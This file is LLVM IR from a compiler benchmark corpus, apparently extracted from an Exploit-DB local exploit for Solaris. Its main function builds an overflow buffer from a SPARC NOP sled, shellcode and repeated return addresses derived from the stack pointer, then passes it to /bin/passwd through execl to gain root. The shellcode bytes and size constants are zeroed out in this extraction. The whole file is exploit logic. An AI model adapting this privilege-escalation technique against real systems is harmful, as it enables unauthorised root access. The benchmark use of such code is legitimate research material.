; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19158.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19158.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUF_LENGTH = common dso_local global i32 0, align 4
@EXTRA = common dso_local global i32 0, align 4
@sparc_shellcode = common dso_local global i32* null, align 8
@STACK_OFFSET = common dso_local global i32 0, align 4
@SPARC_NOP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [45 x i8] c"Jumping to address 0x%lx B[%d] E[%d] SO[%d]\0A\00", align 1
@.str.1 = private unnamed_addr constant [12 x i8] c"/bin/passwd\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"passwd\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"execl failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i32*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %13 = load i32, i32* @BUF_LENGTH, align 4
  %14 = load i32, i32* @EXTRA, align 4
  %15 = add nsw i32 %13, %14
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %5, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %6, align 8
  %19 = load i32*, i32** @sparc_shellcode, align 8
  %20 = call i32 @strlen(i32* %19)
  store i32 %20, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %21 = load i32, i32* %3, align 4
  %22 = icmp sgt i32 %21, 1
  br i1 %22, label %23, label %28

23:                                               ; preds = %2
  %24 = load i8**, i8*** %4, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 1
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26)
  store i32 %27, i32* %12, align 4
  br label %28

28:                                               ; preds = %23, %2
  %29 = bitcast i8* %18 to i32*
  store i32* %29, i32** %8, align 8
  %30 = call i32 (...) @get_sp()
  %31 = load i32, i32* @STACK_OFFSET, align 4
  %32 = sub nsw i32 %30, %31
  %33 = load i32, i32* %12, align 4
  %34 = sub nsw i32 %32, %33
  %35 = sext i32 %34 to i64
  store i64 %35, i64* %7, align 8
  store i32 0, i32* %10, align 4
  br label %36

36:                                               ; preds = %49, %28
  %37 = load i32, i32* %10, align 4
  %38 = sext i32 %37 to i64
  %39 = load i32, i32* @BUF_LENGTH, align 4
  %40 = load i32, i32* %11, align 4
  %41 = sub nsw i32 %39, %40
  %42 = sext i32 %41 to i64
  %43 = udiv i64 %42, 4
  %44 = icmp ult i64 %38, %43
  br i1 %44, label %45, label %52

45:                                               ; preds = %36
  %46 = load i32, i32* @SPARC_NOP, align 4
  %47 = load i32*, i32** %8, align 8
  %48 = getelementptr inbounds i32, i32* %47, i32 1
  store i32* %48, i32** %8, align 8
  store i32 %46, i32* %47, align 4
  br label %49

49:                                               ; preds = %45
  %50 = load i32, i32* %10, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %10, align 4
  br label %36

52:                                               ; preds = %36
  %53 = load i32*, i32** %8, align 8
  store i32* %53, i32** %9, align 8
  store i32 0, i32* %10, align 4
  br label %54

54:                                               ; preds = %66, %52
  %55 = load i32, i32* %10, align 4
  %56 = load i32, i32* %11, align 4
  %57 = icmp slt i32 %55, %56
  br i1 %57, label %58, label %69

58:                                               ; preds = %54
  %59 = load i32*, i32** @sparc_shellcode, align 8
  %60 = load i32, i32* %10, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i32, i32* %59, i64 %61
  %63 = load i32, i32* %62, align 4
  %64 = load i32*, i32** %9, align 8
  %65 = getelementptr inbounds i32, i32* %64, i32 1
  store i32* %65, i32** %9, align 8
  store i32 %63, i32* %64, align 4
  br label %66

66:                                               ; preds = %58
  %67 = load i32, i32* %10, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %10, align 4
  br label %54

69:                                               ; preds = %54
  %70 = load i32*, i32** %9, align 8
  store i32* %70, i32** %8, align 8
  store i32 0, i32* %10, align 4
  br label %71

71:                                               ; preds = %83, %69
  %72 = load i32, i32* %10, align 4
  %73 = sext i32 %72 to i64
  %74 = load i32, i32* @EXTRA, align 4
  %75 = sext i32 %74 to i64
  %76 = udiv i64 %75, 4
  %77 = icmp ult i64 %73, %76
  br i1 %77, label %78, label %86

78:                                               ; preds = %71
  %79 = load i64, i64* %7, align 8
  %80 = trunc i64 %79 to i32
  %81 = load i32*, i32** %8, align 8
  %82 = getelementptr inbounds i32, i32* %81, i32 1
  store i32* %82, i32** %8, align 8
  store i32 %80, i32* %81, align 4
  br label %83

83:                                               ; preds = %78
  %84 = load i32, i32* %10, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %10, align 4
  br label %71

86:                                               ; preds = %71
  %87 = load i64, i64* %7, align 8
  %88 = load i32, i32* @BUF_LENGTH, align 4
  %89 = load i32, i32* @EXTRA, align 4
  %90 = load i32, i32* @STACK_OFFSET, align 4
  %91 = call i32 @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), i64 %87, i32 %88, i32 %89, i32 %90)
  %92 = call i32 @execl(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0), i8* %18, i8* null)
  %93 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0))
  %94 = load i8*, i8** %5, align 8
  call void @llvm.stackrestore(i8* %94)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @strlen(i32*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @get_sp(...) #2

declare dso_local i32 @printf(i8*, i64, i32, i32, i32) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
